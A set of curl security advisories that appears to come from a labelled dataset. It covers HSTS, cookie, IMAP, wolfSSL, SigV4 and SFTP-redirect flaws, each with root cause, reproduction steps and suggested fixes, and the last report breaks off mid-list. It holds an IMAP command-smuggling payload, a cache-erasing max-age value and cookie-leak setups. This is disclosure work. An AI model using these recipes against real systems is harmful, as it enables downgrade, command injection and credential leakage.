title: CVE-2026-87862: HSTS cache import drops longer-lived child
body:
# HSTS cache import silently drops a longer-lived child beneath an includeSubDomains parent

## Summary

Loading an HSTS cache (file or `CURLOPT_HSTSREADFUNCTION` callback) can silently discard a child entry. When a live `includeSubDomains` parent is imported before a longer-lived `includeSubDomains` child, only the parent is retained. After the parent expires, the child's independently valid HSTS policy is gone and curl sends a plaintext HTTP request instead of upgrading to HTTPS. This violates the independent-policy model required by RFC 6797 §5.3.

## Affected versions

The file-load path regressed in commit `a94973805df96269bf3f3bf0a20ccb9887313316` (CVE-2024-9681 fix), first released in curl 8.11.0. The callback-load path inherited the same logic in commit `e65ba1bd349a7affb09275a442b6a0837df079d9`, released in curl 8.20.0. Verified at `c2676bf9e639e31e44b12a2cc82cf2046231b056`.

## Root cause

`hsts_add_host_expire()` in `lib/hsts.c` calls `hsts_check(h, host, hostlen, subdomain)` with `subdomain=TRUE` at line 464. `hsts_check()` performs hierarchical matching: if the parent `.example.test` is already loaded with `includeSubDomains`, it returns the parent as a match for `child.example.test`. The caller creates an entry only when no match exists, and its update branch runs only when the returned hostname exactly matches the imported hostname. An ancestor match therefore causes neither an update nor a creation — the child is silently dropped.

Network-learned `Strict-Transport-Security` processing does not have this problem because `Curl_hsts_parse()` uses exact-only lookup (`hsts_check(..., FALSE)`) at line 296.

## Reproduction steps
Build curl from current master (or any version since 8.11.0) with HSTS support enabled and ENABLE_DEBUG=ON (for CURL_TIME clock control).
Create an HSTS cache file with two includeSubDomains entries where the parent is listed first and the child has a later expiry, e.g.:
.example.test "20241010 00:00:00"
.child.example.test "20251010 00:00:00"
Set the clock to a time when both entries are still valid (e.g. CURL_TIME=1728465947, October 2024).
Run any curl request with --hsts <cache-file> to force curl to load and rewrite the cache.
Inspect the rewritten cache file — it now contains only one entry (the parent). The child entry has been silently dropped.
Advance the clock past the parent's expiry but before the child's (e.g. CURL_TIME=1728600000, October 11 2024).
Start a plaintext HTTP server on localhost and run curl --hsts <cache-file> --resolve child.example.test:80:127.0.0.1 http://child.example.test/.
Observe that curl sends the request over plaintext HTTP instead of upgrading to HTTPS — the child's still-valid HSTS policy is gone.
As a control, repeat with the child listed before the parent in the original cache file — both entries are preserved and the request is correctly upgraded to HTTPS.
As a second control, repeat with the child entry without includeSubDomains (no leading dot: child.example.test) — both entries are preserved regardless of ordering.

## Suggested fix

Use exact-host lookup for import deduplication, as `Curl_hsts_parse()` already does for network-learned policies. Replace the `hsts_check()` call at line 464 with `subdomain=FALSE`:

```diff
-    e = hsts_check(h, host, hostlen, subdomain);
+    e = hsts_check(h, host, hostlen, FALSE);
```

This reserves hierarchical matching for deciding whether HSTS applies to a request, while import deduplication only matches on exact hostname.

## Impact

## Summary:
When curl rewrites its HSTS cache after loading, the child entry is gone. After the parent expires, a request to `http://child.example.test` is no longer upgraded to HTTPS. An active network attacker can observe or modify traffic that should have been protected by HSTS.

The prerequisites limit practical severity: HSTS must be enabled; both entries must use `includeSubDomains`; the parent must be loaded first while still live; the child must outlive it; and the collapsed state must persist until after the parent expires. Reloading from an intact original source after parent expiry restores the child.
label: real

cve.summary: HSTS cache import drops longer-lived child

title: CVE-2026-87863: HSTS response erases persisted entries
body:
## Summary

An authenticated HTTPS origin can return a `Strict-Transport-Security: max-age` value that `Curl_hsts_parse()` accepts but `curlx_gmtime()` cannot later serialize. On 64-bit platforms, `max-age=67768036190000000` produces an absolute expiry within `time_t` range but outside `struct tm`'s representable range. During HSTS cache save, `Curl_fopen()` truncates the original cache file before writing a temporary replacement. When serialization fails, the temporary file is deleted, leaving the original cache empty. The save error is silently discarded by `Curl_close()`, so curl exits successfully.

The result is cross-origin persistent HSTS state loss: one HTTPS origin erases policies for all unrelated hosts sharing the same HSTS cache file.

## Affected Versions
This is a remotely triggerable escalation of the truncation regression in [#21610](https://github.com/curl/curl/issues/21610), introduced by commit `0c667188e0` ("fopen: optimize") and shipped in curl 8.2.0. The `gmtime_r()` overflow gap was previously discussed in [#7720](https://github.com/curl/curl/issues/7720); that fix special-cased `TIME_T_MAX` but does not cover smaller accepted timestamps outside `struct tm`'s range.

All versions from 8.2.0 onward are affected, provided HSTS file-based persistence is enabled (--hsts <file> or CURLOPT_HSTS).

## Root cause

1. `Curl_hsts_parse()` (`lib/hsts.c:243`) parses `max-age` via `curlx_str_number()` with limit `TIME_T_MAX`. The value `67768036190000000` fits, so no overflow occurs. It is added to the current time (line 293) to form an absolute expiry.

2. `Curl_hsts_save()` (`lib/hsts.c:387`) calls `Curl_fopen()`. On non-Windows, `Curl_fopen()` opens the destination with write/truncate mode (`lib/curl_fopen.c:98`) before checking whether it is a regular file (lines 101-104). The original cache is now zero bytes.

3. `hsts_out()` (`lib/hsts.c:348-351`) calls `curlx_gmtime()` on the absolute expiry. It fails because the timestamp exceeds `struct tm`'s representable range. `Curl_hsts_save()` breaks out of the serialization loop, closes and deletes the temporary file (`lib/hsts.c:399-404`). Nothing replaces the truncated original.

4. `Curl_close()` discards the return value of `Curl_hsts_save()` (`lib/url.c:260`). The transfer and process exit successfully.

Before commit `0c667188e0`, `Curl_fopen()` called `stat()` without opening the file, then conditionally opened it. The "optimize" commit switched to `fopen()` first (which truncates), then `fstat()` on the file descriptor — introducing the destructive side-effect.

## Impact

The immediate impact is cross-origin persistent HSTS state loss. Plaintext exposure additionally requires:

1. File-backed HSTS persistence (`--hsts <file>` or `CURLOPT_HSTS`).
2. A later process or cache reload.
3. An explicit `http://` URL for a host whose policy was erased.
4. An on-path attacker able to intercept that later plaintext connection.

The triggering response must come from an HTTPS origin trusted by the client. The `--hsts` feature is opt-in.

## Reproduction
1. Build curl from commit c2676bf9e639e31e44b12a2cc82cf2046231b056 on a 64-bit Linux or macOS host with OpenSSL, using cmake with -DCURL_USE_OPENSSL=ON.

2. Generate a self-signed TLS certificate for the hostname attacker.test (with a matching SAN), valid for at least one day.

3. Create a seed HSTS cache file (test.cache) containing a pre-existing entry for an unrelated host, e.g.:

# Your HSTS cache. https://curl.se/docs/hsts.html
# This file was generated by libcurl! Edit at your own risk.
unrelated.test "20991231 23:59:59"

4. Start a local HTTPS server on 127.0.0.1:8443 using the generated certificate that responds to any GET request with a 200 OK and the header Strict-Transport-Security: max-age=67768036190000000.

5. Run curl against the local HTTPS server, pointing at the seed cache:
 curl --silent --show-error --cacert server.pem --noproxy '*' \
  --resolve attacker.test:8443:127.0.0.1 --hsts test.cache \
  https://attacker.test:8443/

6. Verify the exit code is 0 — curl reports success.

7. Check the cache file size — it will be exactly 0 bytes. The pre-existing unrelated.test entry is gone.

8. Confirm HSTS policy loss by loading the empty cache in a new curl process and requesting http://unrelated.test:8080/ with --write-out '%{url_effective}'. The URL will remain http:// (no HSTS upgrade), proving the policy was erased.

9. As a control, repeat step 5 with an ordinary max-age=3600 instead. The cache file will retain the unrelated.test entry and add the attacker.test entry normally, confirming the issue is specific to the unserializable value.

## Suggested fix

1. In `Curl_fopen()`, do not open the destination in truncate mode to inspect it. `stat()` the existing path without modifying it, write the complete output to a temporary file, and atomically rename only after every entry is serialized successfully.

2. In `Curl_hsts_parse()` or `hsts_out()`, reject or clamp accepted `max-age` values whose absolute expiry `curlx_gmtime()` cannot serialize, rather than silently failing at save time.

3. Do not discard the `Curl_hsts_save()` result in `Curl_close()`.

## Impact

## Summary:
The immediate impact is cross-origin persistent HSTS state loss. Plaintext exposure additionally requires:

1. File-backed HSTS persistence (`--hsts <file>` or `CURLOPT_HSTS`).
2. A later process or cache reload.
3. An explicit `http://` URL for a host whose policy was erased.
4. An on-path attacker able to intercept that later plaintext connection.

The triggering response must come from an HTTPS origin trusted by the client. The `--hsts` feature is opt-in.

The attacker's goal is to strip HSTS protection from unrelated domains, enabling a classic SSL-stripping / protocol downgrade attack.
label: real

title: CVE-2026-82209: domain-scoped PSL domain cookie
body:
## Summary

When libpsl is enabled and a response host is itself a public suffix (e.g. `github.io`), a `Set-Cookie` header whose `Domain` attribute exactly equals that host is accepted by `psl_is_cookie_domain_acceptable()` but stored with `tailmatch = TRUE`. RFC 6265 §5.3 requires this exact-match case to produce a host-only cookie. Because curl keeps it domain-scoped, the cookie is sent to any sibling host (e.g. `attacker.github.io`) on a subsequent request or redirect.

## Affected versions

The vulnerable code path exists in at least curl 8.21.0 (latest GA release) and the current 8.22.0-DEV tree. The `parse_domain()` logic has been unchanged across many prior releases. libpsl must be enabled at build time (`--with-libpsl`), which most distribution packages do.

## Root cause

In `lib/cookie.c`, `parse_domain()` unconditionally sets `co->tailmatch = TRUE` for every explicit non-IP `Domain` attribute (line ~512):

```c
if(!is_ip)
  co->tailmatch = TRUE;
```

Later, `is_public_suffix()` calls `psl_is_cookie_domain_acceptable(psl, "github.io", "github.io")`. libpsl intentionally returns "acceptable" for exact equality — the caller is expected to handle the host-only conversion. curl never does.

When `Curl_cookie_getlist()` builds the outgoing `Cookie` header, it calls `cookie_tailmatch("github.io", 9, "attacker.github.io")` which returns `TRUE` (suffix match with a preceding `.`), so the cookie leaks.

## Reproduction
1. Build curl at commit c2676bf9e639e31e44b12a2cc82cf2046231b056 (or any version from 8.21.0 onward) on a 64-bit Linux or macOS host, ensuring libpsl is enabled (--with-libpsl or -DCURL_USE_LIBPSL=ON). Confirm the build includes libpsl by checking that curl --version output contains libpsl.

2. Start a local HTTP server on port 8080 that serves two endpoints:

/set-domain — responds with 302, sets Set-Cookie: sid=SECRET; Domain=github.io; Path=/, and redirects to http://attacker.github.io:8080/sink.
/sink — responds with 200 and echoes back the received Cookie header value in the response body.

3. Map the test hostnames to localhost using curl's --resolve flag:

github.io:8080:127.0.0.1
attacker.github.io:8080:127.0.0.1

4. Run the vulnerable request — make a request to http://github.io:8080/set-domain with redirect following enabled (-L) and a cookie jar (-c /tmp/domain.jar):

```
curl -sS -L --noproxy '*' \
  --resolve github.io:8080:127.0.0.1 \
  --resolve attacker.github.io:8080:127.0.0.1 \
  -c /tmp/domain.jar \
  http://github.io:8080/set-domain
```

5. Observe the response body — it will contain sid=SECRET, proving the cookie was sent to attacker.github.io (the redirect target), a sibling host under the same public suffix.

6. Inspect the cookie jar — the entry for the domain cookie will show .github.io with the subdomain-match flag set to TRUE, confirming it was incorrectly stored as domain-scoped.

7. Run a negative control — repeat the same flow but have the server set the cookie without an explicit Domain attribute (i.e., Set-Cookie: sid=HOST_ONLY; Path=/). The redirect target at attacker.github.io will receive <none> — the cookie is correctly not sent. The cookie jar will show github.io with subdomain-match FALSE (host-only).

8. Run a second negative control — issue the same Domain=github.io cookie from a sibling host (tenant.github.io) instead of the apex. Curl correctly rejects it — the cookie jar will be empty and nothing is sent to the redirect target.

## Suggested fix

After `psl_is_cookie_domain_acceptable()` accepts exact equality between the request host and a public-suffix cookie domain, clear `tailmatch` so the cookie becomes host-only. Non-exact public-suffix Domain attempts should continue to be rejected. Concretely, after the PSL acceptance in `Curl_cookie_add()`, add:

```c
if(co->tailmatch && domain && co->domain &&
   curl_strequal(co->domain, domain) &&
   psl_is_public_suffix(psl, lcookie))
  co->tailmatch = FALSE;
```

## Impact

## Summary:
An attacker controlling a sibling host under a public suffix (trivial on hosting platforms like GitHub Pages, Heroku, Netlify) can receive cookies that the public-suffix apex issued with an explicit `Domain` matching itself. The attacker cannot *plant* the cookie — exploitation requires the apex to issue such a cookie and the curl client to subsequently contact the attacker sibling. The PSL boundary that libpsl is intended to enforce is violated.
label: real

title: CVE-2026-80255: secure cookie attribute bypass with tab
body:
## Summary

A `Set-Cookie` header using HTAB (horizontal tab) instead of SPACE before the `Secure` attribute — e.g. `Set-Cookie: sid=SECRET;\tSecure` — causes curl to store the cookie without its Secure flag. The cookie is then sent over plaintext HTTP on subsequent requests to the same host.

The space-separated form `Set-Cookie: sid=SECRET; Secure` works correctly.

## Affected versions

curl 8.13.0 through at least 8.21.0 (all versions containing commit `1aea05a6c26`, "cookie: convert to using strparse", 2025-02-18).

## Root cause

In `lib/cookie.c`, `parse_cookie_header()` uses a do/while loop that parses each cookie attribute:

```c
do {
    if(!curlx_str_cspn(&ptr, &name, ";\t\r\n=")) {
        // parse attribute
    }
} while(!curlx_str_single(&ptr, ';'));
```

After consuming the `;` separator, `ptr` points at the HTAB. Since `\t` is in the reject set of `curlx_str_cspn`, the function sees it as the first character, returns an empty match (failure), and the `if` block is skipped. Then `curlx_str_single(&ptr, ';')` fails because the current byte is `\t`, not `;`, so the loop exits. The `Secure` attribute is never parsed, but the cookie is still stored.

The previous parser (before `1aea05a6c26`) had `while(ISBLANK(*ptr)) ptr++;` before parsing each attribute, which correctly skipped HTAB. This blank-skipping was lost in the strparse conversion. The helper `curlx_str_passblanks()` exists in the codebase but is not called here.

## Reproduction
1. Build curl at commit c2676bf9e639e31e44b12a2cc82cf2046231b056 (or any version from 8.13.0 onward) with OpenSSL support enabled.

2. Generate a self-signed TLS certificate for the hostname test.invalid, valid for at least one day.

3. Start a local server that listens on two ports:

HTTPS on port 8443 — serves Set-Cookie: sid=HTAB_SECRET;\tSecure (with a literal HTAB character 0x09 before Secure) when the path is /htab, and Set-Cookie: sid=SPACE_SECRET; Secure (with a normal space) when the path is /space.
HTTP on port 8080 — echoes back the received Cookie header value in the response body.

4. Set the HTAB cookie over HTTPS by requesting https://test.invalid:8443/htab, saving the cookie jar:
```
curl -ks --noproxy '*' \
  --resolve test.invalid:8443:127.0.0.1 \
  -c /tmp/htab.jar \
  https://test.invalid:8443/htab
Make a follow-up request over plaintext HTTP using the saved cookie jar:
```
```
curl -sS --noproxy '*' \
  --resolve test.invalid:8080:127.0.0.1 \
  -b /tmp/htab.jar \
  http://test.invalid:8080/
```
6. Observe that the cookie is sent over HTTP — the response body will contain sid=HTAB_SECRET, proving the Secure flag was silently dropped and the cookie leaked over plaintext.

7. Inspect the cookie jar — the fourth field (Secure flag) for the HTAB cookie will be FALSE, confirming curl did not store the Secure attribute.

8. Run the control case — repeat steps 4-5 using the /space endpoint instead, which sets the cookie with a normal space before Secure. The follow-up HTTP request will receive <none> — the cookie is correctly withheld. The cookie jar will show the Secure flag as TRUE.

## Suggested fix

Add `curlx_str_passblanks(&ptr);` after the `;` is consumed in the do/while loop, before `curlx_str_cspn` parses the next attribute name. Add a regression test comparing `;\tSecure` against `; Secure` and verifying neither cookie is returned for an HTTP URL.

## Relationship to existing work

This is distinct from PR #21185 / test 1685 (commit `8e8bdd3604`), which addresses HTAB *inside* a cookie attribute value (e.g. `Path=/foo\tbar`). This issue concerns HTAB *before* an attribute name, causing the attribute to be silently discarded.

## Impact

## Summary:

The `Secure` flag is a confidentiality boundary that prevents cookies from being sent over unencrypted connections. Silently dropping it means a session cookie intended to be HTTPS-only is exposed on any subsequent HTTP request to the same host. A network attacker observing that HTTP traffic can capture the cookie. All attributes at or after the HTAB position are similarly skipped (e.g. `HttpOnly`).

HTAB is valid optional whitespace per both RFC 6265 section 5.2 and the HTTP grammar (OWS). The old parser handled it correctly.
label: real

cve.summary: secure cookie attribute bypass with tab

title: CVE-2026-87864: IMAP APPEND plus CRLF conversion command injection
body:
## Summary

When `CURLOPT_CRLF` is enabled, `imap_perform_append()` advertises the **original** input file size in the IMAP `APPEND ... {N}` literal but then transmits the **expanded** body (bare LF → CRLF). The server consumes exactly N bytes as the literal, and the overflow bytes are parsed as new IMAP commands in the same authenticated session.

This is a protocol framing bug — curl tells the server "here come N bytes," then sends more than N — not a case of the user injecting CRLFs into a protocol field. The bytes originate in the upload body, and curl's own conversion moves them across the literal boundary.

## Affected versions

Tested and confirmed on commit `c2676bf9e639e31e44b12a2cc82cf2046231b056` (curl 8.22.0-DEV) and curl 8.6.0. The mismatch likely dates back to IMAP APPEND's introduction in 7.30.0.

## Root cause

In `lib/imap.c`, `imap_perform_append()` sets up the upload reader with the original size and sends it in the IMAP literal:

```c
result = Curl_creader_set_fread(data, data->state.infilesize);
...
result = imap_sendf(data, imapc, "APPEND %s%s {%" FMT_OFF_T "}",
                    mailbox, curlx_dyn_ptr(&flags), data->state.infilesize);
```

The `cr-lineconv` reader (`lib/sendf.c`) converts each bare LF to CRLF and explicitly returns `-1` for its total length because the converted size is unknown. `Curl_req_send_more()` (`lib/request.c`) drains the reader until EOS — it does not stop at the IMAP-declared boundary.

An N-byte input containing k bare LFs produces N+k wire bytes while the server was told to consume only N.

## Reproduction
1. Build curl at commit c2676bf9e639e31e44b12a2cc82cf2046231b056 (or any version from 7.30.0 onward) on a Linux or macOS host, without TLS (plain IMAP is sufficient for reproduction).

2. Create a 66-byte upload file consisting of A\n repeated 22 times (44 bytes), followed by the 22-byte suffix \nX CREATE "Injected"\r\n. The 22 bare LFs before the suffix are chosen so that CRLF expansion adds exactly 22 bytes — pushing the suffix past the declared literal boundary.

3. Start a local IMAP server on port 11430 that implements standard IMAP framing: respond to CAPABILITY, LOGIN, and APPEND. On APPEND, parse the {N} literal size from the command, send + continue, then consume exactly N bytes from the socket as the literal body. After consuming the literal and its terminating CRLF, read and record the next line received (the first post-literal command).

4. Run curl with CRLF conversion enabled, uploading the payload via IMAP APPEND:
```
curl -sS --user user:pass --upload-file payload.bin --crlf \
  imap://127.0.0.1:11430/INBOX
```

5. Observe that curl exits with code 0 — it reports success.

6. Check what the IMAP server received after the literal — it will have parsed X CREATE "Injected" as a standalone IMAP command, separate from the APPEND literal. This proves that bytes from the upload body escaped the declared literal boundary and were interpreted as IMAP protocol commands.

7. Run a control case without --crlf using the same payload and an identical IMAP server on a different port. Without CRLF conversion, the entire 66-byte payload fits within the declared 66-byte literal. The first post-literal command will be curl's normal LOGOUT, and the X CREATE "Injected" text remains safely inside the message body.

8. Compare the two cases — in both, curl declared a 66-byte literal in the APPEND command. With --crlf, the 22 bare LFs expanded to CRLFs, producing 88 wire bytes against a 66-byte declaration. The server consumed 66 bytes as the literal, and the remaining 22 bytes (\r\nX CREATE "Injected"\r\n) were parsed as protocol — the CRLF terminated the APPEND and X CREATE "Injected" executed as a new command.


## Suggested fix

Reject the `CURLOPT_CRLF` / `CURLOPT_TRANSFERTEXT` + IMAP APPEND combination with an explicit error, or pre-compute the converted size before sending the APPEND literal declaration. Truncating output at the declared length would prevent command escape but silently corrupt the message — an explicit failure is preferable.

## Impact

## Summary:

An attacker who controls the content of an uploaded message can inject arbitrary IMAP commands when:

- the application enables CRLF conversion (`CURLOPT_CRLF` / `--crlf`),
- the upload has a known size (required by IMAP APPEND in curl),
- curl performs an authenticated IMAP APPEND, and
- the attacker can control the upload bytes with byte-level precision.

The injected commands execute with the authenticated IMAP user's full privileges (CREATE, DELETE, STORE, COPY, etc.). `CURLOPT_TRANSFERTEXT=1` on Unix reaches the same code path.

Conversion is disabled by default, which limits exposure, but the framing violation itself is unconditional whenever conversion is active.
label: real

cve.summary: IMAP APPEND plus CRLF conversion command injection

title: CVE-2026-82208: wolfSSL CA-cache hit overrides callback
body:
## Summary

With the wolfSSL backend, when CA caching is enabled and an `CURLOPT_SSL_CTX_FUNCTION` callback replaces the trust store, curl can silently reinstall the cached store after the callback returns. A certificate trusted by the cached store but rejected by the callback-selected store is then incorrectly accepted.

## Root cause

`Curl_wssl_setup_x509_store()` in `lib/vtls/wolfssl.c` installs a cached X509 store but does not set `wssl->x509_store_setup = TRUE`. That flag is only set inside `wssl_populate_x509_store()`, which runs on cache misses.

The sequence on a cache hit:

1. Before invoking the callback, `wssl_connect_step1()` calls `Curl_wssl_setup_x509_store()` — cached store A is installed, flag stays `false`.
2. The `CURLOPT_SSL_CTX_FUNCTION` callback runs and replaces store A with store B.
3. During the handshake, the still-false flag causes `Curl_wssl_setup_x509_store()` to run again. It finds `CTX_get_cert_store() != cached_store` (the callback changed it), so it reinstalls cached store A.

## Affected versions

Introduced in commit `0f2876b2c33f` (Jul 2024, "wolfSSL: CA store share fix" for #14278). Present in releases **8.9.1 through 8.21.0**.

## Impact

An application that uses `CURLOPT_SSL_CTX_FUNCTION` to restrict trust (e.g. pin to a private CA) has that restriction silently bypassed when CA caching is active. A MITM presenting a certificate valid under the cached store but rejected by the callback's store succeeds.

Prerequisites: wolfSSL backend, `CURLOPT_CA_CACHE_TIMEOUT != 0`, a callback that replaces the store, and differing trust between the two stores.

## Reproduction
1. Build an affected curl release (8.9.1 through 8.21.0) against wolfSSL and configure curl without a compiled-in default CA path so that a CA file is eligible for caching.
2. Create two independent certificate authorities, called CA A and CA B.
3. Create a TLS server certificate for the test hostname, including a matching subject alternative name, and sign it with CA A.
4. Start an HTTPS server on the test hostname using that certificate.
5. Write a small libcurl client that uses the same multi handle for two transfers, sets `CURLOPT_CAINFO` to CA A, and sets a nonzero `CURLOPT_CA_CACHE_TIMEOUT`.
6. Make the first transfer without an SSL-context callback. Confirm that it succeeds and thereby populates curl's CA cache with the trust store containing CA A.
7. For the second transfer, use a fresh connection and register `CURLOPT_SSL_CTX_FUNCTION`. In the callback, replace the wolfSSL context's certificate store with a newly created store containing only CA B.
8. Disable connection reuse and TLS session caching for both transfers so that the second transfer performs a new TLS handshake and certificate verification.
9. Make the second transfer to the same HTTPS server. On a vulnerable build, it incorrectly succeeds even though the callback-selected store contains only CA B and the server certificate chains only to CA A.
10. Repeat the sequence with `CURLOPT_CA_CACHE_TIMEOUT` set to zero. The second transfer should now fail certificate verification, demonstrating that the unexpected acceptance depends on the CA-cache path.
11. As a fixed-version check, repeat the cached sequence on a build containing commit `ed0338befd` or a later release. The second transfer should fail because curl no longer reinstalls CA A after the callback selects CA B.

The callback-selected trust store must remain authoritative. The transfer using store B should reject the server certificate regardless of whether curl's CA cache was previously populated.

## Suggested fix

Set `wssl->x509_store_setup = TRUE` in `Curl_wssl_setup_x509_store()` itself (before returning), rather than only inside `wssl_populate_x509_store()`. This ensures the flag is set on both cache hits and misses, preventing the second invocation from overwriting the callback's store.

## Impact

## Summary:
An attacker able to present a hostname-valid certificate trusted by curl’s cached CA store—but rejected by the application-selected store—can impersonate the intended TLS endpoint. This bypasses the application’s trust policy and may allow interception or modification of encrypted traffic.
label: real

title: CVE-2026-86409: stale SigV4 headers sent unintended
body:
## Summary

Setting `CURLOPT_AWS_SIGV4` to `NULL` returns `CURLE_OK` but does not disable SigV4 authentication. The handler in `lib/setopt.c` clears the parameter string (`STRING_AWS_SIGV4`) but never removes the `CURLAUTH_AWS_SIGV4` bit from `data->set.httpauth`. A subsequent `curl_easy_perform()` on the same handle still sends an `Authorization: AWS4-HMAC-SHA256` header to whatever URL is set next.

This contradicts the documentation in `docs/libcurl/opts/CURLOPT_AWS_SIGV4.md`:

> Using this option multiple times makes the last set string override the previous ones. Set it to NULL to disable its use again.

Tested at commit `c2676bf9e639e31e44b12a2cc82cf2046231b056`.

## Root cause

`lib/setopt.c`, lines 2061-2072:

```c
case CURLOPT_AWS_SIGV4:
    result = Curl_setstropt(data, STRING_AWS_SIGV4, ptr);
    if(CURL_EASY_STR(data, STRING_AWS_SIGV4))
      s->httpauth = CURLAUTH_AWS_SIGV4;
    break;
```

When `ptr` is `NULL`, `Curl_setstropt` clears `STRING_AWS_SIGV4`, but the conditional only handles the non-NULL case. There is no `else` branch to clear `CURLAUTH_AWS_SIGV4` from `s->httpauth`.

For comparison, `CURLOPT_HTTPSIG` in the same file handles this correctly:

```c
if(arg)
  s->httpauth = (uint32_t)CURLAUTH_HTTPSIG;
else
  s->httpauth &= ~(uint32_t)CURLAUTH_HTTPSIG;
```

On the next `curl_easy_perform()`, `lib/transfer.c:505` copies the stale `data->set.httpauth` (still containing `CURLAUTH_AWS_SIGV4`) into `data->state.authhost.want`. The authentication path in `lib/http.c` selects SigV4, and `Curl_output_aws_sigv4()` proceeds. Because the parameter string is now empty, `parse_sigv4_params()` in `lib/http_aws_sigv4.c:820` silently falls back to `"aws:amz"` and derives region/service from the hostname.

## Impact

An application that reuses an easy handle, retains `CURLOPT_USERPWD` credentials, relies on the documented `NULL` reset, and then performs a request to an attacker-influenced URL will unintentionally send a signed SigV4 `Authorization` header to that destination. The header exposes the access-key identifier and a request-bound signature. The secret key is not transmitted and the signature is bound to method, host, path, headers, payload, and timestamp, which constrains replay.

## Affected versions
curl 7.75.0 through 8.21.0, plus 8.22.0 prereleases before c3c70440e8.

## Reproduction

1. Build an affected curl release, starting with 7.75.0, with AWS SigV4 authentication support enabled.
2. Start an HTTP recording server that logs the request path and complete `Authorization` header for several requests.
3. Create one libcurl easy handle and configure a write callback so response data does not affect the test.
4. Set test credentials through `CURLOPT_USERPWD`. Nonproduction values are sufficient because the receiving server only records the generated header.
5. Enable SigV4 by setting `CURLOPT_AWS_SIGV4` to an explicit provider, region, and service string.
6. Point the handle at the recording server and perform a first request.
7. Confirm that the first request contains an `Authorization: AWS4-HMAC-SHA256` header with the configured access-key identifier and credential scope.
8. Set `CURLOPT_AWS_SIGV4` to `NULL` on the same easy handle and confirm that `curl_easy_setopt()` returns `CURLE_OK`.
9. Change the handle's URL to a second path or destination while retaining the existing `CURLOPT_USERPWD` value.
10. Perform a second request with the same easy handle and inspect the recorded headers.
11. Observe the vulnerable result: the second request still contains an AWS SigV4 `Authorization` header even though SigV4 was disabled according to the documented API.
12. Confirm that the parameter string itself was cleared by checking that the second signature uses curl's fallback provider or derives its region and service from the new hostname rather than using the original explicit values.
13. As a control, set `CURLOPT_HTTPAUTH` to `CURLAUTH_NONE` and perform a third request.
14. Confirm that the control request contains no `Authorization` header, demonstrating that stale authentication selection caused the second header.
15. Confirm a fix by testing a revision containing commit `c3c70440e8`, or by clearing the `CURLAUTH_AWS_SIGV4` bit when `CURLOPT_AWS_SIGV4` receives `NULL`.
16. Repeat the sequence and verify that the first request is signed while both requests made after the `NULL` reset contain no SigV4 authorization header.

### Expected result

Setting `CURLOPT_AWS_SIGV4` to `NULL` must disable SigV4 authentication. No subsequent request should contain a SigV4 `Authorization` header unless the application enables it again.

### Vulnerable result

Curl clears the SigV4 parameter string but retains the authentication-selection bit. Reusing the easy handle therefore signs later requests with the retained credentials and fallback parameters.

## Suggested fix

Add an `else` branch to clear the authentication bit when the parameter becomes `NULL`:

```c
case CURLOPT_AWS_SIGV4:
    result = Curl_setstropt(data, STRING_AWS_SIGV4, ptr);
    if(CURL_EASY_STR(data, STRING_AWS_SIGV4))
      s->httpauth = CURLAUTH_AWS_SIGV4;
    else
      s->httpauth &= ~CURLAUTH_AWS_SIGV4;
    break;
```

A regression test should enable SigV4, reset the option to `NULL`, reuse the handle, and verify that no `Authorization` header is sent on the subsequent request.

## Impact

## Summary:
An attacker who can influence a request made after the documented SigV4 reset may cause the application to sign an unintended request with retained AWS credentials. This exposes the access-key identifier and request-bound signature and, for a compatible service and operation, could authorize unintended actions. The secret key itself is not disclosed, and replay is constrained by the signed request details and timestamp.
label: real

title: CVE-2026-86410:  redirect to SFTP or SCP bypasses host verification
weakness: Improper Validation of Certificate with Host Mismatch
body:
## Summary

`ssh_setopts()` in `src/config2setopts.c` returns immediately when the initial URL is not SCP or SFTP. This means `--knownhosts`, `--hostpubsha256`, and `--hostpubmd5` are never installed on the easy handle when the initial URL is HTTPS. If `--location --proto-redir +sftp` is used and the server returns a `Location: sftp://…` redirect, the SFTP connection proceeds without any of the user's requested SSH host-key verification.

Commit `ab3bb8cd8be8f9d4acb97da0418abc279182041e` fixed CVE-2026-12064 for `--proto-default` but did not touch the early-return guard that causes this redirect variant. The vulnerable guard is present in the released `curl-8_21_0` tag and at current HEAD.

## Affected versions

Affected versions: curl CLI 7.81.0 through 8.21.0, plus affected 8.22.0

## Root cause

In `src/config2setopts.c`, `ssh_setopts()` (line 205) bails out early:

```c
if(use_proto != proto_scp && use_proto != proto_sftp)
  return CURLE_OK;
```

`use_proto` is derived from the initial command-line URL in `config2setopts()`. When the initial URL is HTTPS, none of `CURLOPT_SSH_KNOWNHOSTS`, `CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256`, or `CURLOPT_SSH_HOST_PUBLIC_KEY_MD5` are set on the easy handle. Redirect handling occurs inside libcurl and does not rerun `config2setopts()`, so the SFTP connection has no host-key verification policy. Verbose output on the redirected connection explicitly reports `SSH: no knownhosts file configured`.

## Security impact

An attacker who can impersonate the redirected SFTP endpoint can substitute downloaded content while curl reports success. The user's explicit `--knownhosts` or `--hostpubsha256` policy is silently ignored.

Preconditions:

1. SSH-enabled curl build (libssh2 or libssh).
2. `--location --proto-redir +sftp` (user explicitly enables SFTP redirects).
3. A trusted HTTPS origin that redirects to SFTP.
4. Authentication credentials usable at the SFTP endpoint.
5. An attacker able to impersonate the SSH endpoint.

I expect Low severity given the narrow attack surface and leave classification to the security team.

## Reproduction

1. Build an affected curl command-line tool, starting with 7.81.0, with SFTP support through libssh2 or libssh and HTTPS support through a TLS backend.
2. Start an SFTP server with a known SSH host key, valid test credentials, and a file containing recognizable test data.
3. Create a `known_hosts` file for the SFTP hostname and port that deliberately contains a different SSH host key.
4. Start an HTTPS server with a certificate that curl can validate normally.
5. Configure the HTTPS server to return a redirect whose `Location` header points to the test file on the SFTP server.
6. As a direct-transfer control, invoke curl against the SFTP URL with the mismatching `--knownhosts` file.
7. Confirm that the direct transfer fails host-key verification and does not download the file. This demonstrates that the file is valid and enforced for an initially selected SFTP protocol.
8. Invoke curl against the HTTPS URL with certificate verification enabled, redirect following enabled, SFTP explicitly permitted in `--proto-redir`, and the same mismatching `--knownhosts` file.
9. Observe the vulnerable result: curl follows the redirect, authenticates to the SFTP server, downloads the file, and reports success despite the requested host-key policy mismatch.
10. Enable verbose output and confirm that the redirected SFTP connection reports that no known-hosts file was configured.
11. Repeat the redirected transfer using a deliberately incorrect `--hostpubsha256` value instead of, or in addition to, the mismatching `known_hosts` file.
12. Confirm that the redirected transfer also omits that host-key pin while a direct SFTP request enforces it.
13. As a protocol-policy control, remove SFTP from the redirect allowlist and repeat the HTTPS request.
